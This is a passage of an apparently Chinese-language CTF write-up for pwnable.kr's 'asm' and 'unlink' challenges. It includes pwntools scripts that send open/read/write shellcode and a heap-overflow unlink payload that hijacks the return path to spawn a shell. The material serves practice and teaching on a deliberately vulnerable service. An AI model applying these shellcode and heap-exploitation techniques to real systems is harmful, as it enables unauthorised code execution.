</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Try to make shellcode that spits flag using open()/read()/write() systemcalls only.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;If this does not challenge you. you should play&#39;asg&#39;challenge :)</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=kt>char</span><span class=o>*</span> <span class=n>sh</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span><span class=o>*</span><span class=p>)</span><span class=n>mmap</span><span class=p>(</span><span class=mh>0x41414000</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>,</span> <span class=mi>7</span><span class=p>,</span> <span class=n>MAP_ANONYMOUS</span> <span class=o>|</span> <span class=n>MAP_FIXED</span> <span class=o>|</span> <span class=n>MAP_PRIVATE</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>memset</span><span class=p>(</span><span class=n>sh</span><span class=p>,</span> <span class=mh>0x90</span><span class=p>,</span> <span class=mh>0x1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>memcpy</span><span class=p>(</span><span class=n>sh</span><span class=p>,</span> <span class=n>stub</span><span class=p>,</span> <span class=n>strlen</span><span class=p>(</span><span class=n>stub</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>offset</span> <span class=o>=</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>stub</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;give me your x64 shellcode:&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>sh</span><span class=o>+</span><span class=n>offset</span><span class=p>,</span> <span class=mi>1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>alarm</span><span class=p>(</span><span class=mi>10</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>chroot</span><span class=p>(</span><span class=s>&#34;/home/asm_pwn&#34;</span><span class=p>);</span>	<span class=c1>// you are in chroot jail. so you can&#39;t use symlink in /tmp
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=n>sandbox</span><span class=p>();</span>
</span></span><span class=line><span class=cl>	<span class=p>((</span><span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=p>)(</span><span class=kt>void</span><span class=p>))</span><span class=n>sh</span><span class=p>)();</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>程序通过 <code>sandbox</code> 函数和 <code>chroot</code> 禁止我们使用符号链接和除了 <code>open, read, write</code> 之外的函数，同时题目给出了一个 <code>readme</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>once you connect to port 9026, the &#34;asm&#34; binary will be executed under asm_pwn privilege.
</span></span><span class=line><span class=cl>make connection to challenge (nc 0 9026) then get the flag. (file name of the flag is same as the one in this directory)
</span></span></code></pre></td></tr></table></div></div><p>flag 的文件名是一个已知的非常长的字符串。</p><p>根据提示，我们知道我们需要写一段 <code>shellcode</code>，并通过最后的 <code>((void (*)(void))sh)();</code> 执行。在执行前，程序还会执行一段汇编代码，也就是这里的 <code>stub</code> 数组中的内容，利用 <code>pwntools</code> 的 <code>disasm</code> 工具得到汇编代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>   0:   48                      dec    eax
</span></span><span class=line><span class=cl>   1:   31 c0                   xor    eax,eax
</span></span><span class=line><span class=cl>   3:   48                      dec    eax
</span></span><span class=line><span class=cl>   4:   31 db                   xor    ebx,ebx
</span></span><span class=line><span class=cl>   6:   48                      dec    eax
</span></span><span class=line><span class=cl>   7:   31 c9                   xor    ecx,ecx
</span></span><span class=line><span class=cl>   9:   48                      dec    eax
</span></span><span class=line><span class=cl>   a:   31 d2                   xor    edx,edx
</span></span><span class=line><span class=cl>   c:   48                      dec    eax
</span></span><span class=line><span class=cl>   d:   31 f6                   xor    esi,esi
</span></span><span class=line><span class=cl>   f:   48                      dec    eax
</span></span><span class=line><span class=cl>  10:   31 ff                   xor    edi,edi
</span></span><span class=line><span class=cl>  12:   48                      dec    eax
</span></span><span class=line><span class=cl>  13:   31 ed                   xor    ebp,ebp
</span></span><span class=line><span class=cl>  15:   4d                      dec    ebp
</span></span><span class=line><span class=cl>  16:   31 c0                   xor    eax,eax
</span></span><span class=line><span class=cl>  18:   4d                      dec    ebp
</span></span><span class=line><span class=cl>  19:   31 c9                   xor    ecx,ecx
</span></span><span class=line><span class=cl>  1b:   4d                      dec    ebp
</span></span><span class=line><span class=cl>  1c:   31 d2                   xor    edx,edx
</span></span><span class=line><span class=cl>  1e:   4d                      dec    ebp
</span></span><span class=line><span class=cl>  1f:   31 db                   xor    ebx,ebx
</span></span><span class=line><span class=cl>  21:   4d                      dec    ebp
</span></span><span class=line><span class=cl>  22:   31 e4                   xor    esp,esp
</span></span><span class=line><span class=cl>  24:   4d                      dec    ebp
</span></span><span class=line><span class=cl>  25:   31 ed                   xor    ebp,ebp
</span></span><span class=line><span class=cl>  27:   4d                      dec    ebp
</span></span><span class=line><span class=cl>  28:   31 f6                   xor    esi,esi
</span></span><span class=line><span class=cl>  2a:   4d                      dec    ebp
</span></span><span class=line><span class=cl>  2b:   31 ff                   xor    edi,edi
</span></span></code></pre></td></tr></table></div></div><p>这里把所有寄存器都清零了，这样实际上更方便我们写 <code>shellcode</code>。</p><p>考虑如何用系统调用读取文件并显示出来：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>fd</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=n>filepath</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>100</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mi>100</span><span class=p>);</span> <span class=c1>// stdout
</span></span></span></code></pre></td></tr></table></div></div><p>然后我们利用 <code>pwntools</code> 的 <code>shellcraft</code> 模块，将上面的代码转化成汇编即可。我们要取得 <code>fd</code> 也就是 <code>open</code> 的返回值，显然在 <code>rax</code> 里；然后从 <code>rax</code> 中读取 flag 内容，放到栈上，也就是 <code>rsp</code> 上：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>arch</span><span class=o>=</span><span class=s1>&#39;amd64&#39;</span><span class=p>,</span> <span class=n>os</span><span class=o>=</span><span class=s1>&#39;linux&#39;</span><span class=p>,</span> <span class=n>log_level</span><span class=o>=</span><span class=s1>&#39;DEBUG&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s1>&#39;pwnable.kr&#39;</span><span class=p>,</span> <span class=mi>9026</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s1>&#39;this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong&#39;</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>+=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=s1>&#39;rax&#39;</span><span class=p>,</span> <span class=s1>&#39;rsp&#39;</span><span class=p>,</span> <span class=mi>100</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>+=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span><span class=s1>&#39;rsp&#39;</span><span class=p>,</span> <span class=mi>100</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;shellcode:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>shellcode</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=unlink>unlink</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=k>typedef</span> <span class=k>struct</span> <span class=n>tagOBJ</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>tagOBJ</span><span class=o>*</span> <span class=n>fd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>tagOBJ</span><span class=o>*</span> <span class=n>bk</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>8</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=p>}</span><span class=n>OBJ</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>shell</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>    <span class=n>system</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>unlink</span><span class=p>(</span><span class=n>OBJ</span><span class=o>*</span> <span class=n>P</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=n>OBJ</span><span class=o>*</span> <span class=n>BK</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>OBJ</span><span class=o>*</span> <span class=n>FD</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>BK</span><span class=o>=</span><span class=n>P</span><span class=o>-&gt;</span><span class=n>bk</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>FD</span><span class=o>=</span><span class=n>P</span><span class=o>-&gt;</span><span class=n>fd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>FD</span><span class=o>-&gt;</span><span class=n>bk</span><span class=o>=</span><span class=n>BK</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>BK</span><span class=o>-&gt;</span><span class=n>fd</span><span class=o>=</span><span class=n>FD</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>*</span> <span class=n>argv</span><span class=p>[]){</span>
</span></span><span class=line><span class=cl>    <span class=n>malloc</span><span class=p>(</span><span class=mi>1024</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>OBJ</span><span class=o>*</span> <span class=n>A</span> <span class=o>=</span> <span class=p>(</span><span class=n>OBJ</span><span class=o>*</span><span class=p>)</span><span class=n>malloc</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=n>OBJ</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=n>OBJ</span><span class=o>*</span> <span class=n>B</span> <span class=o>=</span> <span class=p>(</span><span class=n>OBJ</span><span class=o>*</span><span class=p>)</span><span class=n>malloc</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=n>OBJ</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=n>OBJ</span><span class=o>*</span> <span class=n>C</span> <span class=o>=</span> <span class=p>(</span><span class=n>OBJ</span><span class=o>*</span><span class=p>)</span><span class=n>malloc</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=n>OBJ</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// double linked list: A &lt;-&gt; B &lt;-&gt; C
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>A</span><span class=o>-&gt;</span><span class=n>fd</span> <span class=o>=</span> <span class=n>B</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>B</span><span class=o>-&gt;</span><span class=n>bk</span> <span class=o>=</span> <span class=n>A</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>B</span><span class=o>-&gt;</span><span class=n>fd</span> <span class=o>=</span> <span class=n>C</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>C</span><span class=o>-&gt;</span><span class=n>bk</span> <span class=o>=</span> <span class=n>B</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;here is stack address leak: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>A</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;here is heap address leak: %p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>A</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;now that you have leaks, get shell!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// heap overflow!
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>gets</span><span class=p>(</span><span class=n>A</span><span class=o>-&gt;</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// exploit this unlink!
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>unlink</span><span class=p>(</span><span class=n>B</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>题目提供了指针 A 在栈上的地址和其所指对象在堆上的地址，随后出现了一个堆溢出漏洞，显然是要我们溢出 A 的 buf 去覆盖 B 的内容，然后 <code>unlink(B)</code>。</p><p><code>unlink</code> 函数的原理和双向链表中删除结点是一样的，不规范地缩写一下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[P-&gt;fd]-&gt;bk = P-&gt;bk
</span></span><span class=line><span class=cl>[P-&gt;bk]-&gt;fd = P-&gt;fd
</span></span></code></pre></td></tr></table></div></div><p>然而，尽管 <code>P->fd->bk</code> 和 <code>P->bk->fd</code> 会被检查合法性，这两句赋值语句中的 <code>P->fd</code> 和 <code>P->bk</code> 都不会被检查，换句话说我们可以用这个特性使右边的地址覆盖掉左边地址。</p><blockquote><p>再简单一点，注意到 <code>->fd</code> 等于 <code>+0x0</code>，<code>->bk</code> 等于 <code>+0x4</code>，也就是：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[P]+0x4 = P+0x4
</span></span><span class=line><span class=cl>[P+0x4] = P
</span></span></code></pre></td></tr></table></div></div></blockquote><p>例如，我们可以修改 main 返回地址：<code>ret_addr = shell_addr</code>，也就是令 <code>P->fd=ebp, P->bk=shell_addr</code>（注意到 <code>[P->fd]->bk=ebp+4</code>）。然而，当执行下一句时，有 <code>[P->bk]->fd=*(shell_addr)=shell()</code>，会被 <code>P->fd</code> 也就是 <code>ebp</code> 覆盖掉，导致我们的 <code>shell()</code> 函数被修改。反之同理。</p><p>或者，我们可以往栈上写 <code>shell()</code> 或者 GOT 劫持，由于 <code>NX</code> 保护和库函数缺失，这里也不能用。</p><p>最后，我们先找到了 <code>shell()</code> 地址 <code>0x80484eb</code>，随后在汇编中发现关键代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>mov</span> <span class=no>ecx</span><span class=p>,</span> <span class=p>[</span><span class=no>ebp-0x4</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nf>leave</span>
</span></span><span class=line><span class=cl><span class=nf>lea</span> <span class=no>esp</span><span class=p>,</span> <span class=p>[</span><span class=no>ecx-0x4</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nf>retn</span>
</span></span></code></pre></td></tr></table></div></div><p>这里的代码逻辑很奇怪：<code>leave</code> 已经恢复 <code>esp</code> 了，下一句又改变了 <code>esp</code> 的值。换个写法：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>ecx</span> <span class=o>=</span> <span class=p>[</span><span class=n>ebp</span><span class=o>-</span><span class=mh>0x4</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>esp</span> <span class=o>=</span> <span class=n>ecx</span><span class=o>-</span><span class=mh>0x4</span>
</span></span><span class=line><span class=cl><span class=n>eip</span> <span class=o>=</span> <span class=n>esp</span>
</span></span></code></pre></td></tr></table></div></div><p>这样就很清晰了，我们可以通过影响 <code>esp</code> 来影响返回地址，这就需要我们控制 <code>ecx</code>。控制 <code>ecx</code>，也就是控制 <code>[ebp-0x4]</code>。</p><p>那我们最终肯定是要让 <code>esp = shell_addr</code>，为了产生这个 <code>shell_addr</code>，首先要把 <code>shell()</code> 写入堆上的某个安全（不会被修改）的地方，显然 <code>A->buf</code> 开头是非常理想的位置。</p><p>此时有 <code>shell_addr = A+0x8</code>（两个指针 8 字节），那就要让 <code>esp = ecx-0x4 = A+0x8</code>，得 <code>ecx = A+0xc</code>。</p><p>这需要 <code>[ebp-0x4] = A+0xc</code>，这就到了 <code>unlink</code> 出场的时候了。我们设置 <code>B->bk</code> 为 <code>ebp-0x4</code>，<code>B->fd</code> 为 <code>A+0xc</code>，按照前面说的原理就能实现覆盖（注：此时 <code>A->buf[4:8]</code> 被修改，这不会有影响），此时堆长这样（每块 4 字节）：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl> ---------
</span></span><span class=line><span class=cl>| A-&gt;fd   |
</span></span><span class=line><span class=cl> ---------
</span></span><span class=line><span class=cl>| A-&gt;bk   |
</span></span><span class=line><span class=cl> ---------
</span></span><span class=line><span class=cl>| shell() | // A-&gt;buf[0:4]
</span></span><span class=line><span class=cl> ---------
</span></span><span class=line><span class=cl>|         | // A-&gt;buf[4:8]
</span></span><span class=line><span class=cl> ---------
</span></span><span class=line><span class=cl>| A+0xc   | // B-&gt;fd
</span></span><span class=line><span class=cl> ---------
</span></span><span class=line><span class=cl>| ebp-0x4 | // B-&gt;bk
</span></span><span class=line><span class=cl> ---------
</span></span><span class=line><span class=cl>| B-&gt;buf  |
</span></span><span class=line><span class=cl>  ...
</span></span></code></pre></td></tr></table></div></div><p>问题来了：</p><ol><li>上面的 <code>A</code> 是 A 的栈地址还是 A 所指对象的堆地址？</li><li>如何得到 <code>ebp-0x4</code>？</li></ol><p>第一个问题很容易，我们最终需要获取的内容是 <code>shell()</code>，这个东西被我们放在了 A 所指的 OBJ 对象里，所以我们去拿 <code>A+0x8</code> 很明显是指 A 的堆地址，也就是 <code>heap address leak</code>。</p><p>第二个问题，题目给的 <code>stack_leak</code> 我们似乎还没有用，怎么用呢？因为我们需要用 A 在栈上的地址找到 <code>ebp-0x4</code> 的值，所以计算一下两者的偏移量即可。在汇编代码中可以找到 A,B,C 分别位于 <code>ebp-0x14, ebp-0xc, ebp-0x10</code> 的位置，那就可以推出 <code>ebp-0x4 = (ebp-0x14) + 0x10 = stack address leak + 0x10</code>。</p><p>最终 payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>ssh</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s1>&#39;pwnable.kr&#39;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>2222</span><span class=p>,</span> <span class=n>user</span><span class=o>=</span><span class=s1>&#39;unlink&#39;</span><span class=p>,</span> <span class=n>password</span><span class=o>=</span><span class=s1>&#39;guest&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>process</span><span class=p>(</span><span class=s1>&#39;./unlink&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;stack address leak:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>stack_leak</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>10</span><span class=p>),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s1>&#39;heap address leak:&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>heap_leak</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>9</span><span class=p>),</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>shell_addr</span> <span class=o>=</span> <span class=mh>0x80484eb</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>p32</span><span class=p>(</span><span class=n>shell_addr</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mi>12</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>heap_leak</span><span class=o>+</span><span class=mh>0xc</span><span class=p>)</span> <span class=o>+</span> <span class=n>p32</span><span class=p>(</span><span class=n>stack_leak</span><span class=o>+</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>此外，我们刚才仅仅利用了第二句话 <code>[P->bk]->fd = P->fd</code>，另一句话并没有用。那能不能只用另一句话 <code>[P->fd]->bk = P->bk</code> 来完成这题呢？当然是可以的。实际上，区别很微妙。</p><p>这里不同于刚才控制 <code>[ebp-0x4]</code> 修改 <code>ecx</code> 的思路，而是直接想办法修改 <code>ebp</code> 引起 <code>ecx</code> 变化，目标还是让 <code>[ebp-0x4]=A+0xc</code>。</p><p>令 <code>P->fd = ebp-0x8</code>，<code>P->bk = A+0xc</code>，则我们会发现 <code>[P->fd]->bk</code> 指向 <code>ecx</code>，此时我们又能用 <code>A+0xc</code> 覆盖 <code>ecx</code> 了！</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl> ---------
</span></span><span class=line><span class=cl>| ebp-0x8 | // B-&gt;fd
</span></span><span class=line><span class=cl> ---------
</span></span><span class=line><span class=cl>| A+0xc   | // B-&gt;bk
</span></span><span class=line><span class=cl> ---------
